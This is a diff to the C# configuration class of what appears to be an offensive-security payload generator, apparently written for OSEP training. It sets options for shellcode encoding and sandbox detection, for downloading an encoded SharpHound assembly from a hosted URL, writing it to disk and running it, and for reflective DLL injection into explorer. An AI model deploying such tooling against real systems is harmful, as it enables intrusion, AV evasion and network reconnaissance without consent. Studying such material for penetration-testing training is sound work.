@@ -18,6 +18,10 @@ public static class CONFIG
     //InstallUtil Variables
     public static string INSTALL_UTIL_EXE_PATH = @"C:\Windows\Temp\iu.exe"; //Location of your PE that contains malware.
 
+
+
+
+
     //Evasion
     public static bool ENCODED = false; //Meaning that you have used the custom encoder (From the helper tool) on the shell code. Not MSFVenom encoders. This ensures your shellcode will get decoded first.
     public static byte KEY = 0xf4;
@@ -25,13 +29,19 @@ public static class CONFIG
     public static bool DETECT_SANDBOX_BAD_IMPORT = false; 
 
 
-    //Commands
-    public static string STATIC_COMMAND = "calc.exe"; //If an artifact is running a run off command, it will be this one.
+    //PowerShell Settings
+    public static string PS_STATIC_COMMAND = "calc.exe"; //If an artifact is running a run off command, it will be this one.
+    public static string PS_DYNAMIC_SCRIPT_NAME = "myscript.ps1";
 
 
     //Execute Assembly Properties
-    public static string EA_STATIC_PATH = @"C:\Users\warum\source\repos\OSEP_2026\TestingArea\bin\x64\result.exe"; //Path to the assembly you want to execute. This is a static path, meaning it will always be the same.
-    public static string[] EA_STATIC_ARGS = { "hello"," world"};
+    public static string EA_STATIC_PATH = @"C:\Users\warum\SharpHound-encoded.exe"; //Path to the assembly you want to execute. This is a static path, meaning it will always be the same.
+    public static string[] EA_STATIC_ARGS = { "/c","all"};
+    public static string EA_DYNAMIC_URL = $"{HTTP_URL}/SharpHound-encoded.exe";
+    public static string EA_DYNAMIC_ARGUMENTS_URL = $"{HTTP_URL}/args.txt";
+    public static bool EA_DYNAMIC_WRITE_ASSEMBLY_TO_DISK = true;
+    public static bool EA_ASSEMBLY_IS_ENCODED = true;
+    public static string EA_ASSEMBLY_WRITE_LOCATION = "C:\\Users\\warum\\test-assembly.exe";
 
 
     //VBA Macro properties
@@ -100,12 +110,13 @@ public static class CONFIG
 
 
 
-    //Invoke Reflection Options
+    //Invoke Reflection DLL Options
     public static string INVOKEREF_HOSTED_DLL_NAME = "invref_callback.dll"; //The name of the malicious dll we want to invoke.
     public static string INVOKEREF_HOSTED_SCRIPT_NAME = "Invoke-ReflectivePEInjection.ps1"; //The name of the PS Script to facilitate injection
     public static string INVOKEREF_TARGET_PROCESS = "explorer";//Name of the process we want to inject into
     public static string INVOKEREF_VARNAMEA = "bytes"; //variable names
     public static string INVOKEREF_VARNAMEB = "procid";
+    
 
 
 
